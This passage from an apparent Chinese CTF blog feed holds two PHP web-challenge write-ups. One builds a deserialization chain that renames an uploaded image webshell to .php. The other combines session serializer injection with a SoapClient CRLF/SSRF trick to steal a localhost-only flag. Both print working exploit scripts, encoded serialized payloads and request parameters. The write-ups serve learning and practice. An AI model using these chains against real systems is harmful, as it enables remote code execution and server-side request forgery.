class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$register</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$register</span>-&gt;checker = <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$register</span>)));</span><br></pre></td></tr></table></figure><blockquote><p>payload构造:这里把except的键值对赋为<code>[&#39;index&#39; =&gt; &#39;img&#39;];</code>就能使访问<code>except[&#39;index&#39;] = &#39;img&#39;</code>，应该是这样。然后<code>img = upload_imp</code>，那最后就能调用到<code>upload_img</code>方法了。</p></blockquote><blockquote><p>然后就是下面的分析，这里创建register对象借助对象销毁时的析构函数，当<code>!register-&gt;registed==true</code>时，即<code>register-&gt;registed==false</code>时，执行<code>$this-&gt;checker-&gt;index();</code>，而如果把<code>$this-&gt;checker</code>赋为<code>$profile</code>那就能利用到上面的payload了，然后进入profile.php文件，首先是调用<code>index()</code>不存在的方法，调用到<code>__call()</code>魔术方法，然后调用<code>$this-&gt;index</code>不存在的变量，即调用<code>__get()</code>魔术方法，然后就能调用到<code>upload_img()</code>方法，然后就能该文件名了</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**register.php里面的析构函数*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**profile.php里面的两个有用的魔术方法*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里的copy等操作的分析:前面的就不分析了，因为我们上传的本来就是图片马，这后面的反序列化的操作只是为了改掉我们上传的文件名使其能够成功被解析从而getshell。</p></blockquote><p>直接就下面的这个代码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_img</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Forbidden type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknow file type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实没啥好分析的，目录和文件名都进行了md5加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#profile.php的构造函数里面进行了对目录的md5加密</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;upload_menu=<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#profile.php的upload_img()方法里面进行的对文件名的md5加密</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;filename=<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="3-5反序列化流程"><a href="#3-5反序列化流程" class="headerlink" title="3.5反序列化流程"></a>3.5反序列化流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">index.php触发反序列化。内容放在cookie中</span><br><span class="line">Register类的析构函数。访问$this-&gt;Profile类-&gt;index()函数</span><br><span class="line">index()函数不存在。触发call魔法函数。判断$this-&gt;index</span><br><span class="line">$this-&gt;index不存在。触发get魔法函数。访问$this-&gt;except[&#x27;index&#x27;]</span><br><span class="line">调用upload_img函数</span><br><span class="line">设置各个参数的变量。最后重命名图片</span><br></pre></td></tr></table></figure><p><a href="https://guokeya.github.io/post/VmI2NBAXh/">参考文章</a></p><h2 id="4-解题步骤"><a href="#4-解题步骤" class="headerlink" title="4.解题步骤"></a>4.解题步骤</h2><p>这里先构造图片马，上传好之后图片的地址为<br><code>http://bd69d605-98fb-4c65-ae78-787641fea86f.node3.buuoj.cn/upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.png</code><br>相对地址即为<code>/upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.png</code>，下面的payload就能放在本地环境里面获取了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$profile</span>-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>-&gt;img = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename_tmp = <span class="string">&quot;./upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename = <span class="string">&quot;./upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = <span class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$register</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$register</span>-&gt;checker = <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$register</span>)));</span><br></pre></td></tr></table></figure><p>得下面的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjc4OiIuL3VwbG9hZC9jNDE4OTM5Mzg1MzEwNDFiYWRhY2ZjMjJmZWJlM2FiZC8wMGJmMjNlMTMwZmExZTUyNWUzMzJmZjAzZGFlMzQ1ZC5wbmciO3M6ODoiZmlsZW5hbWUiO3M6Nzg6Ii4vdXBsb2FkL2M0MTg5MzkzODUzMTA0MWJhZGFjZmMyMmZlYmUzYWJkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBocCI7czoxMToidXBsb2FkX21lbnUiO047czozOiJleHQiO3M6MzoicG5nIjtzOjM6ImltZyI7czoxMDoidXBsb2FkX2ltZyI7czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czozOiJpbWciO319czo4OiJyZWdpc3RlZCI7YjowO30%3D</span><br></pre></td></tr></table></figure><p><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019//4.png"><br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019//5.png"><br>图片马上传很简单嘛。</p><p>然后连蚁剑，get flag。<br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019//6.png"><br><code>flag&#123;ce475263-8092-4e0d-952e-e08ae5484897&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bestphp_s_revenge</title>
      <link href="/2020/11/14/bestphp-s-revenge/"/>
      <url>/2020/11/14/bestphp-s-revenge/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我的萤火之光但愿也能照亮你前行的路。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1471121498&auto=1&height=66"></iframe><p>看的是王叹之师傅写的博文复现的，师傅太强了，学习学习。<br><strong>这里我也先列知识点了</strong></p><h2 id="1-知识点"><a href="#1-知识点" class="headerlink" title="1.知识点"></a>1.知识点</h2><h3 id="0x0A-PHP反序列化过程中魔术方法执行时间"><a href="#0x0A-PHP反序列化过程中魔术方法执行时间" class="headerlink" title="0x0A.PHP反序列化过程中魔术方法执行时间"></a>0x0A.PHP反序列化过程中魔术方法执行时间</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="0x0B-PHP内置类SoapClient"><a href="#0x0B-PHP内置类SoapClient" class="headerlink" title="0x0B.PHP内置类SoapClient"></a>0x0B.PHP内置类SoapClient</h3><blockquote><p>SOAP是什么:<code>SOAP</code>是基于<code>XML</code>的简易协议，可使应用程序在<code>HTTP</code>之上进行信息交换。或者更简单地说：<code>SOAP</code>是用于访问网络服务的协议。</p></blockquote><p>PHP中SOAP的简单的用法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(location<span class="string">&#x27;=&gt;&#x27;</span>http:<span class="comment">//example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span></span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x0C-CRLF-Injection漏洞"><a href="#0x0C-CRLF-Injection漏洞" class="headerlink" title="0x0C.CRLF Injection漏洞"></a>0x0C.<code>CRLF Injection</code>漏洞</h3><p><a href="https://www.jianshu.com/p/d4c304dbd0af">参考这篇文章</a></p><p>CRLF是<code>回车+换行</code>（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用<code>两个CRLF分隔</code>的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能<code>注入一些会话Cookie或者HTML代码</code>，所以<code>CRLFInjection</code>又叫<code>HTTPResponseSplitting</code>，简称HRS。</p><p>下面请看他的实验<br><img src="/2020/11/14/bestphp-s-revenge//1.png"></p><h3 id="0x0D-serialize-hander处理session方式不同导致session注入"><a href="#0x0D-serialize-hander处理session方式不同导致session注入" class="headerlink" title="0x0D.serialize_hander处理session方式不同导致session注入"></a>0x0D.serialize_hander处理session方式不同导致session注入</h3><p><strong>主要的知识点就是下面的内容</strong></p><p>session.serialize_handler存在以下几种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过<span class="title function_ invoke__">serialize</span>()函数序列化后的值</span><br><span class="line"></span><br><span class="line">php 键名+竖线（|）+经过<span class="title function_ invoke__">serialize</span>()函数处理过的值                 <span class="comment">//**注意这里的竖线是要利用的点*/</span></span><br><span class="line">php_serialize 经过<span class="title function_ invoke__">serialize</span>()函数处理过的值，会将键名和值当作一个数组序列化</span><br></pre></td></tr></table></figure><p>若传入<code>$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;</code><br>序列化引擎使用的是<code>php_serialize</code>，那么储存的<code>session文件</code>内容即为<br><code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code><br>而<code>反序列化引擎</code>如果使用的是<code>php</code>，就会<code>把|作为作为key和value的分隔符</code>。把a:1:{s:4:”name”;s:5:”当作键名，而把O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}当作经过serialize()函数处理过的值，最后会把它<code>O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code>进行unserialize处理，此时就构成了一次<code>反序列化注入攻击</code>。</p><h2 id="2-解题"><a href="#2-解题" class="headerlink" title="2.解题"></a>2.解题</h2><p>先给出源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[f],<span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[name]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[name] = <span class="variable">$_GET</span>[name];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>),<span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!    <span class="comment">//老ssrf了。</span></span><br></pre></td></tr></table></figure><h3 id="0x0a-覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。"><a href="#0x0a-覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。" class="headerlink" title="0x0a.覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。"></a>0x0a.覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。</h3><p><strong>soap构造脚本：</strong></p><blockquote><p>注意：打开php的soap扩展</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;   <span class="comment">//要用soap访问的文件的地址</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;fvck\r\n&quot;</span>.<span class="string">&quot;Cookie:PHPSESSID=fvck&quot;</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;fvck&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="variable">$se</span>;</span><br></pre></td></tr></table></figure><p>得到的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22fvck%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A27%3A%22fvck%0D%0ACookie%3APHPSESSID%3Dfvck%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p><code>第一步:传参</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#GET</span><br><span class="line">?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22fvck%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A27%3A%22fvck%0D%0ACookie%3APHPSESSID%3Dfvck%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line"></span><br><span class="line">#POST</span><br><span class="line"></span><br><span class="line">serialize_handler=php_serialize  //这里设置该页面的序列化引擎</span><br></pre></td></tr></table></figure><p><img src="/2020/11/14/bestphp-s-revenge//3.png"></p><h3 id="0x0b-SSRF"><a href="#0x0b-SSRF" class="headerlink" title="0x0b.SSRF"></a>0x0b.SSRF</h3><p>覆盖变量b，利用call_user_func调用SoapClient类中的不存在方法，触发__call方法，执行ssrf，获得访问flag.php的PHPSESSID。<br><code>传参</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#GET</span><br><span class="line">f=extract&amp;name=SoapClient</span><br><span class="line"></span><br><span class="line">#POST</span><br><span class="line">b=call_user_func    //实现变量覆盖</span><br></pre></td></tr></table></figure><p><img src="/2020/11/14/bestphp-s-revenge//4.png"></p><h3 id="0x0c-以我们设置的cookie为cookie访问页面得flag"><a href="#0x0c-以我们设置的cookie为cookie访问页面得flag" class="headerlink" title="0x0c.以我们设置的cookie为cookie访问页面得flag"></a>0x0c.以我们设置的cookie为cookie访问页面得flag</h3><p><code>flag&#123;d0c9ef1c-69a3-4186-beb9-d23ced03db02&#125;</code><br><img src="/2020/11/14/bestphp-s-revenge//5.png"></p><h4 id="末-分析上面三步"><a href="#末-分析上面三步" class="headerlink" title="末:分析上面三步"></a>末:分析上面三步</h4><p>第一步，f传的值和post的值使其使用<code>php_serialize引擎</code>。而name的值就是将我们的name值以<code>php_serialize引擎的格式存储起来</code>。</p><p>第二步，这次发的请求使用的是默认的php引擎，我们f传值和post传值来使<code>call_user_func($b, 